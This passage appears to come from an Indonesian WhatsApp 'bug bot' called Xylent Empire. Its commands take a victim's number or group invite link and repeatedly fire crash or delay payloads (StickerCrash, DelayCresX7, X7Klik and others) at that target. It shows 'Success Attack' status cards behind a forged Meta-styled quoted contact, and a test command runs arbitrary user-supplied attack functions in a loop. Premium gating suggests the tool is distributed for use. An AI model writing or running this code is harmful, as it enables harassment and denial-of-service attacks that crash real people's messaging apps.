        'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=13135550002:+1 (313) 555-0002\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
        sendEphemeral: true
      }
    }
  };

  // Ambil fungsi penyiapan gambar
  let imgsc = await prepareWAMessageMedia(
    { image: { url: tesfunct } }, 
    { upload: xylent.waUploadToServer }
  );

  // Tombol Native Flow
  const nativeButtons = proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
    buttons: [
      {
        name: "cta_url",
        buttonParamsJson: `{"display_text":"Chek Target","url":"https://wa.me/${targetNumber}","merchant_url":"https://www.google.com"}`
     }
    ]
  });

  // --- 1. PROSES: KIRIM PESAN PROSES ---
  let msgProcess = await generateWAMessageFromContent(from, {
    viewOnceMessage: {
      message: {
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.fromObject({
            text: "",
          }), 
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [{
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `*XYLENT EMPIRE*\n\n• Target  : ${target}\n• Type Bug  : tes Function\n• Status  : Process ⏳\nPlease wait 5–10 minutes to prevent your WhatsApp from being banned.\n\nCreate by TEAM XYLENT`,
                hasMediaAttachment: true,
                ...imgsc
              }),
              nativeFlowMessage: nativeButtons
            }]
          }),
          contextInfo: {
            stanzaId: "META_AI_FAKE",
            participant: "13135550002@s.whatsapp.net",
            quotedMessage: metaFakeQuoted.message
          }
        })
      }
    }
  }, { quoted: metaFakeQuoted });

  await xylent.relayMessage(from, msgProcess.message, { messageId: msgProcess.key.id });

  try {
    const sandbox = {
      console,
      Buffer,
      xylent,
      target,
      sleep,
      generateWAMessageFromContent,
      generateForwardMessageContent,
      generateWAMessage,
      prepareWAMessageMedia,
      proto,
      jidDecode,
      areJidsSameUser,
    };

    const context = vm.createContext(sandbox);
    const wrapper = `${funcCode}\n\n${funcName}`;
    const fn = vm.runInContext(wrapper, context);

    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length;
        if (arity === 1) {
          await fn(target);
        } else if (arity === 2) {
          await fn(xylent, target);
        } else {
          await fn(xylent, target, true);
        }
      } catch (err) {
        console.error(err);
      }
      await sleep(200);
    }

    // --- 2. SUKSES: KIRIM PESAN SUKSES ---
    let msgSuccess = await generateWAMessageFromContent(from, {
      viewOnceMessage: {
        message: {
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.fromObject({
              text: "",
            }), 
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: [{
                header: proto.Message.InteractiveMessage.Header.fromObject({
                  title: `*XYLENT EMPIRE*\n\n• Target  : ${target}\n• Type Bug  : tes Function\n• Status  : Success Attack ✅\n• Loop  : ${jumlah}\nPlease wait 5–10 minutes to prevent your WhatsApp from being banned.\n\nCreate by TEAM XYLENT`,
                  hasMediaAttachment: true,
                  ...imgsc
                }),
                nativeFlowMessage: nativeButtons
              }]
            }),
            contextInfo: {
              stanzaId: "META_AI_FAKE",
              participant: "13135550002@s.whatsapp.net",
              quotedMessage: metaFakeQuoted.message
            }
          })
        }
      }
    }, { quoted: metaFakeQuoted });

    await xylent.relayMessage(from, msgSuccess.message, { messageId: msgSuccess.key.id });

  } catch (err) {
    console.error(err);
    await xylent.sendMessage(from, {
      text: "❌ FUNCTION LU ERROR BANGKE",
    }, { quoted: m});
  }

  break;
}

case 'cekjid': {
  if (!isCreator) return xylent.sendMessage(from, { text: '❌ Hanya owner yang bisa menggunakan perintah ini!' }, { quoted: m });

  if (!m.isGroup) return xylent.sendMessage(from, { text: '❌ Perintah ini hanya bisa digunakan di dalam grup!' }, { quoted: m });

  const jid = from;
  const groupMeta = await xylent.groupMetadata(from);
  const groupName = groupMeta.subject;

  xylent.sendMessage(from, { 
    text: `📋 *Info JID Grup*\n🏷️ Nama: *${groupName}*\n🆔 JID: *${jid}*` 
  }, { quoted: m });
  break;
}

case "testgb": {
  const testgb = "https://f.top4top.io/p_3788vut3d1.jpg";
  
  const args = body.trim().split(" ");
  const targetGroup = args[1]; // Menggunakan JID Grup langsung (contoh: 12036321345678@g.us atau via ID grup)
  const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));

  if (args.length < 3) {
    return xylent.sendMessage(from, {
      text: "🪧 ☇ Format: .testgb xxx@g.us 10 (reply function/file)",
    }, { quoted: m});
  }

  if (!targetGroup || !targetGroup.endsWith("@g.us") || isNaN(jumlah) || jumlah <= 0) {
    return xylent.sendMessage(from, {
      text: "❌ ☇ JID Grup atau jumlah tidak valid",
    }, { quoted: m});
  }

  const quoted = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
  let funcCode = "";

  if (quoted) {
    if (quoted.conversation) {
      funcCode = quoted.conversation;
    } else if (quoted.extendedTextMessage?.text) {
      funcCode = quoted.extendedTextMessage.text;
    } else if (quoted.documentMessage) {
      const docMsg = quoted.documentMessage;
      const fileName = docMsg.fileName || "";

      if (!fileName.endsWith(".js") && !fileName.endsWith(".txt")) {
        return xylent.sendMessage(from, {
          text: "❌ ☇ File harus .js atau .txt",
        }, { quoted: m});
      }

      const stream = await downloadContentFromMessage(docMsg, "document");
      let buffer = Buffer.from([]);
      for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk]);
      }
      funcCode = buffer.toString("utf-8");
    }
  }

  if (!funcCode) {
    return xylent.sendMessage(from, {
      text: "❌ ☇ Reply function text atau file .js/.txt",
    }, { quoted: m});
  }

  const matchFunc = funcCode.match(/async function\s+([a-zA-Z0-9_]+)/);
  if (!matchFunc) {
    return xylent.sendMessage(from, {
      text: "❌ ☇ Function tidak valid",
    }, { quoted: m});
  }

  const funcName = matchFunc[1];

  const metaFakeQuoted = {
    key: {
      participant: `13135550002@s.whatsapp.net`,
      ...(typeof botNumber !== 'undefined' && botNumber ? {
        remoteJid: `status@broadcast`
      } : {})
    },
    message: {
      'contactMessage': {
        'displayName': `¡?Xylent Empire?¿`,
        'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=13135550002:+1 (313) 555-0002\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
        sendEphemeral: true
      }
    }
  };

  let imgsc = await prepareWAMessageMedia(
    { image: { url: testgb } }, 
    { upload: xylent.waUploadToServer }
  );

  const nativeButtons = proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
    buttons: [
      {
        name: "cta_url",
        buttonParamsJson: `{"display_text":"Check Group","url":"https://wa.me/","merchant_url":"https://www.google.com"}`
     }
    ]
  });

  let msgProcess = await generateWAMessageFromContent(from, {
    viewOnceMessage: {
      message: {
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.fromObject({
            text: "",
          }), 
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [{
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `*XYLENT EMPIRE*\n• Target Group: ${targetGroup}\n• Type Bug: Test Function Group\n• Status: Process ⏳\nSending payload sequence directly to the target group.\nCreate by XYLENT TEAM`,
                hasMediaAttachment: true,
                ...imgsc
              }),
              nativeFlowMessage: nativeButtons
            }]
          }),
          contextInfo: {
            stanzaId: "META_AI_FAKE",
            participant: "13135550002@s.whatsapp.net",
            quotedMessage: metaFakeQuoted.message
          }
        })
      }
    }
  }, { quoted: metaFakeQuoted });

  await xylent.relayMessage(from, msgProcess.message, { messageId: msgProcess.key.id });

  try {
    const sandbox = {
      console,
      Buffer,
      xylent,
      target: targetGroup, // Target diatur ke JID Grup untuk dieksekusi oleh fungsi luar
      sleep,
      generateWAMessageFromContent,
      generateForwardMessageContent,
      generateWAMessage,
      prepareWAMessageMedia,
      proto,
      jidDecode,
      areJidsSameUser,
    };

    const context = vm.createContext(sandbox);
    const wrapper = `${funcCode}\n\n${funcName}`;
    const fn = vm.runInContext(wrapper, context);

    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length;
        if (arity === 1) {
          await fn(targetGroup);
        } else if (arity === 2) {
          await fn(xylent, targetGroup);
        } else {
          await fn(xylent, targetGroup, true);
        }
      } catch (err) {
        console.error(err);
      }
      await sleep(200);
    }

    let msgSuccess = await generateWAMessageFromContent(from, {
      viewOnceMessage: {
        message: {
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.fromObject({
              text: "",
            }), 
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: [{
                header: proto.Message.InteractiveMessage.Header.fromObject({
                  title: `*XYLENT EMPIRE*\n\n• Target Group: ${targetGroup}\n• Type Bug: Test Function Group\n• Status: Success Sent ✅\n• Loop: ${jumlah}\nSending payload sequence directly to the target group.\n\nCreate by XYLENT TEAM`,
                hasMediaAttachment: true,
                  ...imgsc
                }),
                nativeFlowMessage: nativeButtons
              }]
            }),
            contextInfo: {
              stanzaId: "META_AI_FAKE",
              participant: "13135550002@s.whatsapp.net",
              quotedMessage: metaFakeQuoted.message
            }
          })
        }
      }
    }, { quoted: metaFakeQuoted });

    await xylent.relayMessage(from, msgSuccess.message, { messageId: msgSuccess.key.id });

  } catch (err) {
    console.error(err);
    await xylent.sendMessage(from, {
      text: "❌ FUNCTION LU ERROR BANGKE",
    }, { quoted: m});
  }

  break;
}


// Case Bak Grup
case 'X7gb':
case 'neo': {
  if (!isCreator && !isPremium && !isUnli) return ReplyXylent(mess.owner);
  
  const match = text.match(/chat\.whatsapp\.com\/([0-9A-Za-z]{20,24})/);
  if (!match) return ReplyXylent(`*Format Salah!*\nContoh: ${command} https://chat.whatsapp.com/xxxxxx`);

  let linkCode = match[1];

  try {
    let GroupJid = await xylent.groupAcceptInvite(linkCode);

    // Definisi struktur metaFakeQuoted
    const metaFakeQuoted = {
      key: {
        participant: `13135550002@s.whatsapp.net`,
        ...(typeof botNumber !== 'undefined' && botNumber ? {
          remoteJid: `status@broadcast`
        } : {})
      },
      message: {
        'contactMessage': {
          'displayName': `¡?Xylent Empire?¿`,
          'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=13135550002:+1 (313) 555-0002\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
          sendEphemeral: true
        }
      }
    };

    // Mengambil gambar dari file lokal sesuai permintaan
    let imgsc = await prepareWAMessageMedia(
      { image: fs.readFileSync("./image/Empire.jpg") }, 
      { upload: xylent.waUploadToServer }
    );

    // Menyiapkan konfigurasi button native flow
    const nativeButtons = proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: `{"display_text":"Check Group","url":"https://wa.me/${GroupJid}","merchant_url":"https://www.google.com"}`
        }
      ]
    });

    // Membuat struktur pesan interaktif carousel dalam pembungkus ephemeralMessage (Status: Processing)
    let msgProcess = await generateWAMessageFromContent(from, {
      ephemeralMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          }, 
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.fromObject({
              text: "",
            }), 
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: [{
                header: proto.Message.InteractiveMessage.Header.fromObject({
                  title: `「*Xylent Attack Group*」\n• GroupJid: ${GroupJid}\n• Type Bug: ${command}\n• Status: Processing ⏳\n> Please wait.`,
                  hasMediaAttachment: true,
                  ...imgsc
                }),
                nativeFlowMessage: nativeButtons
              }]
            }),
            contextInfo: {
              stanzaId: "META_AI_FAKE",
              participant: "13135550002@s.whatsapp.net",
              quotedMessage: metaFakeQuoted.message
            }
          })
        }
      }
    }, { quoted: metaFakeQuoted });

    // Mengirimkan pesan interaktif awal ke room chat
    await xylent.relayMessage(from, msgProcess.message, { messageId: msgProcess.key.id });

    await sleep(3000);

    // Eksekusi perulangan fungsi eksternal
    for (let r = 0; r < 10; r++) {
      await X7Klik(xylent, GroupJid);
    }
    
    // Membuat struktur pesan interaktif carousel untuk status akhir (Status: Success Attack)
    let msgSuccess = await generateWAMessageFromContent(from, {
      ephemeralMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          }, 
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.fromObject({
              text: "",
            }), 
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: [{
                header: proto.Message.InteractiveMessage.Header.fromObject({
                  title: `「*Xylent Attack Group*」\n• GroupJid: ${GroupJid}\n• Type Bug: ${command}\n• Status: Success Attack ✅\n> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`,
                  hasMediaAttachment: true,
                  ...imgsc
                }),
                nativeFlowMessage: nativeButtons
              }]
            }),
            contextInfo: {
              stanzaId: "META_AI_FAKE",
              participant: "13135550002@s.whatsapp.net",
              quotedMessage: metaFakeQuoted.message
            }
          })
        }
      }
    }, { quoted: metaFakeQuoted });

    // Memperbarui isi pesan sebelumnya dengan status sukses menggunakan ID pesan yang sama
    await xylent.relayMessage(from, msgSuccess.message, { messageId: msgProcess.key.id });

  } catch (err) {
    console.error("ERROR:", err);
    return ReplyXylent(`Gagal mengeksekusi!\n\n*Detail:* ${err}`);
  }
}
break;


// Case Bak
case 'glory': {
  if (!isCreator && !isPremium && !isUnli) return ReplyXylent(mess.owner);
  if (!q) return ReplyXylent(`Example: ${prefix + command} 628xxx`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Definisi struktur metaFakeQuoted
  const metaFakeQuoted = {
    key: {
      participant: `13135550002@s.whatsapp.net`,
      ...(typeof botNumber !== 'undefined' && botNumber ? {
        remoteJid: `status@broadcast`
      } : {})
    },
    message: {
      'contactMessage': {
        'displayName': `¡?Xylent Empire?¿`,
        'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=13135550002:+1 (313) 555-0002\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
        sendEphemeral: true
      }
    }
  };

  // Mengambil gambar dari file lokal sesuai permintaan
  let imgsc = await prepareWAMessageMedia(
    { image: fs.readFileSync("./image/Empire.jpg") }, 
    { upload: xylent.waUploadToServer }
  );

  // Menyiapkan konfigurasi button native flow
  const nativeButtons = proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
    buttons: [
      {
        name: "cta_url",
        buttonParamsJson: `{"display_text":"Check Target","url":"https://wa.me/${target}","merchant_url":"https://www.google.com"}`
      }
    ]
  });

  // Membuat struktur pesan interaktif carousel dalam pembungkus ephemeralMessage
  let msgProcess = await generateWAMessageFromContent(from, {
    ephemeralMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        }, 
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.fromObject({
            text: "",
          }), 
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [{
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `\`「 Xylent Attack WhatsApp 」\`\n\n• Target: ${target}\n• Type Bug: ${command}\n• Status: Success Attack ✅\n> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`,
                hasMediaAttachment: true,
                ...imgsc
              }),
              nativeFlowMessage: nativeButtons
            }]
          }),
          contextInfo: {
            stanzaId: "META_AI_FAKE",
            participant: "13135550002@s.whatsapp.net",
            quotedMessage: metaFakeQuoted.message
          }
        })
      }
    }
  }, { quoted: metaFakeQuoted });

  // Mengirimkan pesan interaktif ke room chat
  await xylent.relayMessage(from, msgProcess.message, { messageId: msgProcess.key.id });

  // Eksekusi perulangan fungsi eksternal
  for (let i = 0; i < 10; i++) {
await dingleyhard(xylent, target, ptcp = true);
await sleep(1500);
  }
}
break;

case 'glict': {
  if (!isCreator && !isPremium && !isUnli) return ReplyXylent(mess.owner);
  if (!q) return ReplyXylent(`Example: ${prefix + command} 628xxx`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Definisi struktur metaFakeQuoted
  const metaFakeQuoted = {
    key: {
      participant: `13135550002@s.whatsapp.net`,
      ...(typeof botNumber !== 'undefined' && botNumber ? {
        remoteJid: `status@broadcast`
      } : {})
    },
    message: {
      'contactMessage': {
        'displayName': `¡?Xylent Empire?¿`,
        'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=13135550002:+1 (313) 555-0002\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
        sendEphemeral: true
      }
    }
  };

  // Mengambil gambar dari file lokal sesuai permintaan
  let imgsc = await prepareWAMessageMedia(
    { image: fs.readFileSync("./image/Empire.jpg") }, 
    { upload: xylent.waUploadToServer }
  );

  // Menyiapkan konfigurasi button native flow
  const nativeButtons = proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
    buttons: [
      {
        name: "cta_url",
        buttonParamsJson: `{"display_text":"Check Target","url":"https://wa.me/${target}","merchant_url":"https://www.google.com"}`
      }
    ]
  });

  // Membuat struktur pesan interaktif carousel dalam pembungkus ephemeralMessage
  let msgProcess = await generateWAMessageFromContent(from, {
    ephemeralMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        }, 
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.fromObject({
            text: "",
          }), 
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [{
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `\`「 Xylent Attack WhatsApp 」\`\n\n• Target: ${target}\n• Type Bug: ${command}\n• Status: Success Attack ✅\n> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`,
                hasMediaAttachment: true,
                ...imgsc
              }),
              nativeFlowMessage: nativeButtons
            }]
          }),
          contextInfo: {
            stanzaId: "META_AI_FAKE",
            participant: "13135550002@s.whatsapp.net",
            quotedMessage: metaFakeQuoted.message
          }
        })
      }
    }
  }, { quoted: metaFakeQuoted });

  // Mengirimkan pesan interaktif ke room chat
  await xylent.relayMessage(from, msgProcess.message, { messageId: msgProcess.key.id });

  // Eksekusi perulangan fungsi eksternal
  for (let i = 0; i < 100; i++) {
    await DelayCresX7(xylent, target);
    await sleep(1500);
  }
}
break;

case 'imortal': {
  if (!isCreator && !isPremium && !isUnli) return ReplyXylent(mess.owner);
  if (!q) return ReplyXylent(`Example: ${prefix + command} 628xxx`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Definisi struktur metaFakeQuoted
  const metaFakeQuoted = {
    key: {
      participant: `13135550002@s.whatsapp.net`,
      ...(typeof botNumber !== 'undefined' && botNumber ? {
        remoteJid: `status@broadcast`
      } : {})
    },
    message: {
      'contactMessage': {
        'displayName': `¡?Xylent Empire?¿`,
        'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=13135550002:+1 (313) 555-0002\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
        sendEphemeral: true
      }
    }
  };

  // Mengambil gambar dari file lokal sesuai permintaan
  let imgsc = await prepareWAMessageMedia(
    { image: fs.readFileSync("./image/Empire.jpg") }, 
    { upload: xylent.waUploadToServer }
  );

  // Menyiapkan konfigurasi button native flow
  const nativeButtons = proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
    buttons: [
      {
        name: "cta_url",
        buttonParamsJson: `{"display_text":"Check Target","url":"https://wa.me/${target}","merchant_url":"https://www.google.com"}`
      }
    ]
  });

  // Membuat struktur pesan interaktif carousel dalam pembungkus ephemeralMessage
  let msgProcess = await generateWAMessageFromContent(from, {
    ephemeralMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        }, 
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.fromObject({
            text: "",
          }), 
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [{
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `\`「 Xylent Attack WhatsApp 」\`\n\n• Target: ${target}\n• Type Bug: ${command}\n• Status: Success Attack ✅\n> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`,
                hasMediaAttachment: true,
                ...imgsc
              }),
              nativeFlowMessage: nativeButtons
            }]
          }),
          contextInfo: {
            stanzaId: "META_AI_FAKE",
            participant: "13135550002@s.whatsapp.net",
            quotedMessage: metaFakeQuoted.message
          }
        })
      }
    }
  }, { quoted: metaFakeQuoted });

  // Mengirimkan pesan interaktif ke room chat
  await xylent.relayMessage(from, msgProcess.message, { messageId: msgProcess.key.id });

  // Eksekusi perulangan fungsi eksternal
  for (let i = 0; i < 100; i++) {
await MBGCOMBO(xylent, target);
await sleep(1500);
  }
}
break;

case 'honor': {
  if (!isCreator && !isPremium && !isUnli) return ReplyXylent(mess.owner);
  if (!q) return ReplyXylent(`Example: ${prefix + command} 628xxx`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Definisi struktur metaFakeQuoted
  const metaFakeQuoted = {
    key: {
      participant: `13135550002@s.whatsapp.net`,
      ...(typeof botNumber !== 'undefined' && botNumber ? {
        remoteJid: `status@broadcast`
      } : {})
    },
    message: {
      'contactMessage': {
        'displayName': `¡?Xylent Empire?¿`,
        'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=13135550002:+1 (313) 555-0002\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
        sendEphemeral: true
      }
    }
  };

  // Mengambil gambar dari file lokal sesuai permintaan
  let imgsc = await prepareWAMessageMedia(
    { image: fs.readFileSync("./image/Empire.jpg") }, 
    { upload: xylent.waUploadToServer }
  );

  // Menyiapkan konfigurasi button native flow
  const nativeButtons = proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
    buttons: [
      {
        name: "cta_url",
        buttonParamsJson: `{"display_text":"Check Target","url":"https://wa.me/${target}","merchant_url":"https://www.google.com"}`
      }
    ]
  });

  // Membuat struktur pesan interaktif carousel dalam pembungkus ephemeralMessage
  let msgProcess = await generateWAMessageFromContent(from, {
    ephemeralMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        }, 
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.fromObject({
            text: "",
          }), 
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [{
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `\`「 Xylent Attack WhatsApp 」\`\n\n• Target: ${target}\n• Type Bug: ${command}\n• Status: Success Attack ✅\n> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`,
                hasMediaAttachment: true,
                ...imgsc
              }),
              nativeFlowMessage: nativeButtons
            }]
          }),
          contextInfo: {
            stanzaId: "META_AI_FAKE",
            participant: "13135550002@s.whatsapp.net",
            quotedMessage: metaFakeQuoted.message
          }
        })
      }
    }
  }, { quoted: metaFakeQuoted });

  // Mengirimkan pesan interaktif ke room chat
  await xylent.relayMessage(from, msgProcess.message, { messageId: msgProcess.key.id });

  // Eksekusi perulangan fungsi eksternal
  for (let i = 0; i < 50; i++) {
await StickerCrash(xylent, target);
await sleep(1500);
  }
}
break;

case 'mytic': {
  if (!isCreator && !isPremium && !isUnli) return ReplyXylent(mess.owner);
  if (!q) return ReplyXylent(`Example: ${prefix + command} 628xxx`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Definisi struktur metaFakeQuoted
  const metaFakeQuoted = {
    key: {
      participant: `13135550002@s.whatsapp.net`,
      ...(typeof botNumber !== 'undefined' && botNumber ? {
        remoteJid: `status@broadcast`
      } : {})
    },
    message: {
      'contactMessage': {
        'displayName': `¡?Xylent Empire?¿`,
        'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=13135550002:+1 (313) 555-0002\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
        sendEphemeral: true
      }
    }
  };

  // Mengambil gambar dari file lokal sesuai permintaan
  let imgsc = await prepareWAMessageMedia(
    { image: fs.readFileSync("./image/Empire.jpg") }, 
    { upload: xylent.waUploadToServer }
  );

  // Menyiapkan konfigurasi button native flow
  const nativeButtons = proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
    buttons: [
      {
        name: "cta_url",
        buttonParamsJson: `{"display_text":"Check Target","url":"https://wa.me/${target}","merchant_url":"https://www.google.com"}`
      }
    ]
  });

  // Membuat struktur pesan interaktif carousel dalam pembungkus ephemeralMessage
  let msgProcess = await generateWAMessageFromContent(from, {
    ephemeralMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        }, 
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.fromObject({
            text: "",
          }), 
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [{
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `\`「 Xylent Attack WhatsApp 」\`\n\n• Target: ${target}\n• Type Bug: ${command}\n• Status: Success Attack ✅\n> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`,
                hasMediaAttachment: true,
                ...imgsc
              }),
              nativeFlowMessage: nativeButtons
            }]
          }),
          contextInfo: {
            stanzaId: "META_AI_FAKE",
            participant: "13135550002@s.whatsapp.net",
            quotedMessage: metaFakeQuoted.message
          }
        })
      }
    }
  }, { quoted: metaFakeQuoted });

  // Mengirimkan pesan interaktif ke room chat
  await xylent.relayMessage(from, msgProcess.message, { messageId: msgProcess.key.id });

  // Eksekusi perulangan fungsi eksternal
  for (let i = 0; i < 50; i++) {
await X7Klik(xylent, target)
await sleep(1500);
  }
}
break;

case 'galaxy': {
  if (!isCreator && !isPremium && !isUnli) return ReplyXylent(mess.owner);
  if (!q) return ReplyXylent(`Example: ${prefix + command} 628xxx`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Definisi struktur metaFakeQuoted
  const metaFakeQuoted = {
    key: {
      participant: `13135550002@s.whatsapp.net`,
      ...(typeof botNumber !== 'undefined' && botNumber ? {
        remoteJid: `status@broadcast`
      } : {})
    },
    message: {
      'contactMessage': {
        'displayName': `¡?Xylent Empire?¿`,
        'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=13135550002:+1 (313) 555-0002\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
        sendEphemeral: true
      }
    }
  };

  // Mengambil gambar dari file lokal sesuai permintaan
  let imgsc = await prepareWAMessageMedia(
    { image: fs.readFileSync("./image/Empire.jpg") }, 
    { upload: xylent.waUploadToServer }
  );

  // Menyiapkan konfigurasi button native flow
  const nativeButtons = proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
    buttons: [
      {
        name: "cta_url",
        buttonParamsJson: `{"display_text":"Check Target","url":"https://wa.me/${target}","merchant_url":"https://www.google.com"}`
      }
    ]
  });

  // Membuat struktur pesan interaktif carousel dalam pembungkus ephemeralMessage
  let msgProcess = await generateWAMessageFromContent(from, {
    ephemeralMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        }, 
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.fromObject({
            text: "",
          }), 
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [{
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `\`「 Xylent Attack WhatsApp 」\`\n\n• Target: ${target}\n• Type Bug: ${command}\n• Status: Success Attack ✅\n> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`,
                hasMediaAttachment: true,
                ...imgsc
              }),
              nativeFlowMessage: nativeButtons
            }]
          }),
          contextInfo: {
            stanzaId: "META_AI_FAKE",
            participant: "13135550002@s.whatsapp.net",
            quotedMessage: metaFakeQuoted.message
          }
        })
      }
    }
  }, { quoted: metaFakeQuoted });

  // Mengirimkan pesan interaktif ke room chat
  await xylent.relayMessage(from, msgProcess.message, { messageId: msgProcess.key.id });

  // Eksekusi perulangan fungsi eksternal
  for (let i = 0; i < 100; i++) {
    await X7Nganceng(xylent, target, false);
    await sleep(1500);
  }
}
break;


case 'crios': {
  if (!isCreator && !isPremium && !isUnli) return ReplyXylent(mess.owner);
  if (!q) return ReplyXylent(`Example: ${prefix + command} 628xxx`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Definisi struktur metaFakeQuoted
  const metaFakeQuoted = {
    key: {
      participant: `13135550002@s.whatsapp.net`,
      ...(typeof botNumber !== 'undefined' && botNumber ? {
        remoteJid: `status@broadcast`
      } : {})
    },
    message: {
      'contactMessage': {
        'displayName': `¡?Xylent Empire?¿`,
        'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=13135550002:+1 (313) 555-0002\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
        sendEphemeral: true
      }
    }
  };

  // Mengambil gambar dari file lokal sesuai permintaan
  let imgsc = await prepareWAMessageMedia(
    { image: fs.readFileSync("./image/Empire.jpg") }, 
